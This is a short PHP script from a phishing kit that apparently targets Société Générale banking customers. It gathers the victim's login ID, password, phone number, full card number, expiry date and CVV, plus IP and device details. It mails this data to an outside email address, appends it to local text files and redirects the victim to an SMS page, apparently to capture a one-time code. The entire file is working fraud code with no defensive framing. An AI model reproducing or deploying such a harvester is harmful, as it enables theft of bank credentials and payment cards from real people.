<?php

include("funcs.php");
// for more tools visite https://www.ghostools.com
$message  = "******* New cc SG *******\n\n";
$message .= "Identifiant : ".$_SESSION['user_id']."\n";
$message .= "Password : ".$_SESSION['Hidden1']."\n\n";
$message .= "\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Tél : ".$_SESSION['tel']."\n";
$message .= "******* Téléphone *******\n\n";
$message .= "Numéro de carte : ".$_POST['hehehe']."\n";
$message .= "Date d'expiration : ".$_POST['exp']."\n";
$message .= "CVV : ".$_POST['cv']."\n";
$message .= "***************************************\n\n";

$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";

$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "b@zohomail.com";
$subject = "SG|".$ip."".countryinfo($message);
$headers = "From:  Login <don@mox.fr>";
mail($send,$subject,$message,$headers);
 include 'function.php';
$file = fopen("../infos.txt","a");
fwrite($file,$message);  

header("Location: sms.php");
$handle = fopen("cc.txt", "a");
foreach($_POST as $variable => $value){
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}

fwrite($handle, "\r\n");
fclose($handle);
exit;

?>

